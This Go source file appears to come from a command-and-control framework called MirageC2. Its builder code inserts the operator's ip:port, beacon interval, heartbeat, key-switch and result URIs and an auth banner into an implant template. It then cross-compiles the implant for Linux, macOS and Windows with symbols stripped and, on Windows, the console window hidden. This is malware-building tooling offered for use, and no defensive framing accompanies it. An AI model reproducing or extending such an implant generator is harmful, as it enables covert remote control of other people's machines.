package create

import (
	"MirageC2_V1.0/public/common"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

func ReplaceInFile(ipport string, interval int) error {
	filepath := "MirageClient/maintemp.txt"
	content, _ := ioutil.ReadFile(filepath)
	oldContent1 := "<ip:port>"
	newContent1 := strings.ReplaceAll(string(content), oldContent1, ipport)
	oldContent2 := "<sleeptime>"
	newContent2 := strings.ReplaceAll(newContent1, oldContent2, strconv.Itoa(interval))
	oldContent3 := "<SwitchKeyUri>"
	newContent3 := strings.ReplaceAll(newContent2, oldContent3, common.MConfig.SwitchKeyUri)
	oldContent4 := "<HeartbeatUri>"
	newContent4 := strings.ReplaceAll(newContent3, oldContent4, common.MConfig.HeartbeatUri)
	oldContent5 := "<banner>"
	newContent5 := strings.ReplaceAll(newContent4, oldContent5, common.MConfig.BannerAuth)
	oldContent6 := "<ResultUri>"
	newContent6 := strings.ReplaceAll(newContent5, oldContent6, common.MConfig.ResultUri)

	return ioutil.WriteFile("MirageClient/main.go", []byte(newContent6), 0644)
}

func ClientGenerate(platform, ip string, savepath string) error {
	ReplaceInFile(ip, common.MConfig.CheckInterval)
	var cmd *exec.Cmd
	switch runtime.GOARCH {
	case "amd64":
		if platform == "linux" {
			cmd = exec.Command("go", "build", "-o", savepath, "-ldflags=-s -w", "MirageClient/main.go")
			cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
		} else if platform == "darwin" { // 适配 macOS
			cmd = exec.Command("go", "build", "-o", savepath, "-ldflags=-s -w", "MirageClient/main.go")
			cmd.Env = append(os.Environ(), "GOOS=darwin", "GOARCH=amd64")
		} else {
			cmd = exec.Command("go", "build", "-o", savepath, "-ldflags", "-s -w -H=windowsgui", "MirageClient/main.go")
			cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
		}
	case "arm64":
		if platform == "linux" {
			cmd = exec.Command("go", "build", "-o", savepath, "-ldflags=-s -w", "MirageClient/main.go")
			cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=arm64")
		} else if platform == "darwin" { // 适配 macOS ARM64
			cmd = exec.Command("go", "build", "-o", savepath, "-ldflags=-s -w", "MirageClient/main.go")
			cmd.Env = append(os.Environ(), "GOOS=darwin", "GOARCH=arm64")
		} else {
			cmd = exec.Command("go", "build", "-o", savepath, "-ldflags", "-s -w -H=windowsgui", "MirageClient/main.go")
			cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=arm64")
		}
	}

	return cmd.Run()
}
